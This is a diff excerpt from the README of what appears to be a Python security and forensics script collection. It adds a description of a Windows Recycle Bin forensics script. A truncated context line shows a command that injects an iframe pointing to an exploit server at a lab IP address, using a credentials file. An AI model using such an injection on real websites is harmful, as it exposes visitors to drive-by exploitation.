@@ -42,3 +42,7 @@ http://10.10.10.112:8080/exploit"></iframe>' -f userpass.txt
 Allow to analyse connected wifi through mac adress by reading windows registry  
 Usage from command prompt    
 (py27) C:\Users\Taymour> python discoverNetworks.py -u <username> -p <password>  
+  
+## N) dumpRecycleBin.py  
+  
+Allows to discover deleted items in windows operating system ,also provide information about the user who delete files
